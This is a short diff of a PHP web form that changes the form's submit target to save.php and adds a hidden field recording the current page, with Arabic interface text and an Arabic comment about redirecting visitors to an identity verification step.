@@ -173,8 +173,9 @@ try {
             </p>
 
             <!-- تم تعديل التوجيه هنا ليذهب بالزائر إلى صفحة التوثيق الوطني بالمعرف الصحيح -->
-            <form action="identity_verification.php" method="POST">
+            <form action="save.php" method="POST">
                 <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
+                <input type="hidden" name="current_page" value="update_info.php">
                 <button type="submit" class="btn-continue">استمر</button>
             </form>
         </main>
